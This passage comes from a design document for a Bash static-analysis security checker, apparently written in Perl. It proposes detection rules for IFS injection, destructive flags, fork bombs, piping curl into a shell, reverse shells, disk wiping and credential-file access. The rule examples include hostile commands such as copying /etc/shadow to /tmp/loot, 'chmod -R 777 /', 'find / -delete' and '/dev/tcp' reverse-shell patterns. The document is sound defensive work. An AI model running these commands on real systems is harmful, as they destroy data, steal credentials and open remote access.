  command contains no obvious substitution, yet it bypasses word-split
  and command-injection filters ([Greg Scharf, "Command Injections
  Through Parameter Expansion"](https://blog.gregscharf.com/2023/04/25/command-injection-spaces-limitation/)).
- **Trigger:** source contains both `IFS=` and a token containing
  `$IFS`, *or* source contains `IFS=$'\\x…'` or `IFS=$"…"`.
- **Severity:** high
- **Examples:**
  ```bash
  IFS=/; cmd=cat$IFS/etc/passwd;$cmd
  CMD=$'\x20/etc/passwd' && cat$CMD
  IFS=$' \t\n'
  ```

### R10 — `DangerousFlagExtension` (medium)

- **Path:** `lib/Text/Treesitter/Bash/Security/Rule/DangerousFlagExtension.pm`
- **Why:** the existing `DangerousFlags` rule only watches `rm`. The
  pattern of "destructive flag in argv of a destructive command" is
  worth applying to `mv -f /`, `cp -f /etc/shadow`, `chmod -R 777`,
  `find -delete`, `rsync --delete`.
- **Trigger:**
  - command ∈ `{ rm, mv, cp }` and argv contains `-rf|-fr|-rf|-f` and
    any argv starts with `/` or `~` → high
  - command = `chmod` and argv contains `-R` and any argv contains
    `777` → high
  - command = `find` and argv contains `-delete` → medium
  - command = `rsync` and argv contains `--delete` and source path is
    absolute → medium
- **Severity:** medium to high
- **Examples:**
  ```bash
  rm -rf $1
  mv -f /etc/resolv.conf /tmp/evil
  cp -f /etc/shadow /tmp/loot
  chmod -R 777 /
  find / -delete
  ```

### Honourable mentions (not Top-10 but recommended if/when volume warrants)

- **R11 `ForkBomb`** (high) — regex on source for `:\(\)\{?\s*:\|:\s*&\s*\}\s*;?:`
  and for `while\s+true` without break/return/exit in same node.
- **R12 `ProcessSubstitution`** (medium) — source contains `<(\s*[a-z]` *and*
  command in interpreter list (`bash`, `sh`, `python`, …).
- **R13 `LibraryPathHijack`** (high) — extends `EnvDangerousVars` to
  `PYTHONPATH`, `PERL5LIB`, `RUBYLIB`, `NODE_PATH`, `CLASSPATH`, `GEM_PATH`,
  `JAVA_TOOL_OPTIONS`, `_JAVA_OPTIONS`.
- **R14 `EditorExec`** (high) — command in `{ vim, vi, nvim, nano, less,
  more, man, view, emacs }` and argv contains `-c`, `:!`, `+!`, or
  source contains `!sh` / `:set shell=`.
- **R15 `UnquotedDestructiveArg`** (high) — extends `UnquotedExpansion`
  to specifically flag unquoted variables in argv of destructive
  commands (`rm`, `mv`, `cp`, `dd`, `chmod`, `chown`, `find`, `xargs`,
  `tar`, `rsync`, `ssh`). This is the single highest-impact addition
  for the "AI agent uses unquoted `$USER_INPUT`" class of bug.
- **R16 `MissingShebangExec`** (low) — script with no `#!/…` shebang
  being executed (caller must pipe source to a sub-rule).
- **R17 `PersistViaCron`** (high) — command in `{ crontab, at, systemd-run,
  systemctl }` with source containing redirect to `/etc/cron*`,
  `/var/spool/cron`, `/etc/systemd/system/*.service`.
- **R18 `MissingAbsolutePathForDestructive`** (medium) — extends
  `MissingAbsolutePath` to escalate to medium for `rm`/`mv`/`dd`/`chmod`
  even though they are whitelisted (the relative-path variant in
  scripts is almost always a bug).

---

## 17. Implementation notes for the recommended rules

For all rules above:

1. **Use the `command`/`argv` fields when possible** (cleaner signal than
   raw source). Use `source` only when the rule is about surface text
   (`IFS=`, `${var@P}`, heredocs, etc.).
2. **Severity scaling per context** is encouraged: a single rule can
   return `medium` for a low-confidence match and `high` for a
   high-confidence one (e.g. `ShellInterpreterFlag` is medium if the
   interpreter is followed by `-c` and a quoted string, high if the
   string contains `$`).
3. **Return multiple issues** when a single command matches multiple
   patterns (the `Checker` already flattens).
4. **Avoid regex on `argv` for unquoted detection** — argv is raw, with
   quotes already removed by tree-sitter at tokenization time. Prefer
   `command->{source}` for any rule that depends on quote context.
5. **Test fixtures**: for each rule, add at least one positive and one
   negative case in `t/30_security.t`. Use the `prove -lv t/30_security.t
   -- '<subtest>'` style already established.
6. **Bump `$VERSION`** to `0.003` across `Bash.pm`, `Checker.pm`, all
   `Rule/*.pm` after the first new rule lands (per `perl-core` /
   `CLAUDE.md`).

### Walker upgrade (one-time)

To support R2 / R15 (chain-aware rules), the walker should add an
`executed_command` field that lists the *resolved* next-command on a
pipe (`|`) boundary, so a `curl | bash` rule does not need to look at
sibling commands. This is the only walker change required by the
recommendations above; everything else is rule-local.

---

## 18. Sources

- [Shellshock — Wikipedia](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
- [FFIEC Joint Statement on Shellshock (2014)](https://www.ffiec.gov/sites/default/files/media/press-releases/2014/FFIEC_JointStatement_BASH_Shellshock_Vulnerability.pdf)
- [Red Hat Security Advisory: Bash Code Injection via Environment Variable](https://access.redhat.com/articles/1200223)
- [Praetorian — Critical Bash "Shellshock" Vulnerability](https://www.praetorian.com/blog/critical-bash-shellshock-vulnerability/)
- [OWASP Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [ShellCheck SC2086](https://www.shellcheck.net/wiki/SC2086), [SC2046](https://www.shellcheck.net/wiki/SC2046),
  [SC2154](https://www.shellcheck.net/wiki/SC2154)
- [MITRE ATT&CK T1059.004 — Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
- [MITRE ATT&CK T1552 — Unsecured Credentials](https://attack.mitre.org/techniques/T1552/)
- [MITRE ATT&CK C0063 — 2025 Poland Wiper Attacks](https://attack.mitre.org/techniques/T1059/004/) (uses `dd` for disk overwrite)
- [Greg Scharf — Command Injections Through Parameter Expansion](https://blog.gregscharf.com/2023/04/25/command-injection-spaces-limitation/)
- [GitHub Security Advisory GHSA-g8r9-g2v8-jv6f — Dangerous Shell Expansion Patterns Enable Arbitrary Code Execution](https://github.com/github/copilot-cli/security/advisories/GHSA-g8r9-g2v8-jv6f) (CVE-2026-29783)
- [GTFOBins — env](https://gtfobins.org/gtfobins/env/),
  [find](https://gtfobins.org/gtfobins/find/),
  [nc](https://gtfobins.org/gtfobins/nc/),
  [awk](https://gtfobins.org/gtfobins/awk/),
  [curl](https://gtfobins.org/gtfobins/curl/)
- [CISA / ICS — Bash Command Injection Vulnerability](https://www.cisa.gov/news-events/ics-advisories/icsa-14-269-01a)
- [SIPB MIT — Writing Safe Shell Scripts](https://sipb.mit.edu/doc/safe-shell/)
- [HackerOne — Shell Script Pitfalls and ShellCheck Solutions](https://www.hackerone.com/blog/shell-script-pitfalls-and-shellcheck-solutions)
- [Bash Hackers Wiki — Parameter Expansion](https://bash-hackers.gabe565.com/syntax/pe/)
- [Greg's Wiki — BashPitfalls](https://mywiki.wooledge.org/BashPitfalls)
- [TuxCare — Hide and Seek: New Linux Backdoor Hides Behind .npmrc Files](https://www.tuxcare.com/)
- [Unix StackExchange — Safety considerations for `${!x}` indirect expansion in Bash](https://stackoverflow.com/questions/41791071/safety-considerations-for-x-indirect-expansion-in-bash)

---

## 19. Top-10 recommendations (one-line summary)

1. **`DangerousExpansion`** — flag `${var@P}`, `${!var}`, `${var=…}`,
   nested `$(…)` in `${…}` (high). CVE-2026-29783 class.
2. **`NetworkToShell`** — `curl | bash`, `wget -O- | sh`, `fetch | sh` (high).
3. **`DynamicEval`** — `eval`, `exec`, `source`, `.` with substitution (medium → high).
4. **`ShellInterpreterFlag`** — `bash -c $X`, `python -c $X`, `perl -e $X`,
   `ruby -e $X`, `node -e $X`, `php -r $X` with substitution (high).
5. **`ReverseShellSink`** — `nc -e`, `socat exec:`, `bash -i >& /dev/tcp/`,
   `ssh … ProxyCommand`, socket-code in `python`/`perl` (high).
6. **`DangerousFilesystem`** — `dd of=/dev/sdX`, `mkfs`, `parted`, `: > /etc/…`,
   `truncate -s 0` (high).
7. **`PrivilegeEscalation`** — `sudo` with shell-capable binary, `chmod u+s`,
   `chown root`, `find -exec sh`, `env /bin/sh`, `crontab -` (medium → high).
8. **`CredentialAccess`** — broaden `SensitiveAccess` to `.docker/config.json`,
   `.gnupg/private-keys-v1.d`, `.git-credentials`, `.netrc`, `.pypirc`,
   `.npmrc`, `.cargo/credentials`, `gcloud`/`azure`/`gh` config, `/proc/*/environ`
   (high).
9. **`IFSManipulation`** — `IFS=` together with `$IFS` token, or
   `IFS=$'\\x…'` (high).
10. **`DangerousFlagExtension`** — extend `DangerousFlags` to `mv -f /`,
    `cp -f /etc/shadow`, `chmod -R 777`, `find -delete`, `rsync --delete`,
    and to unquoted `$VAR` in argv of any destructive command (medium → high).
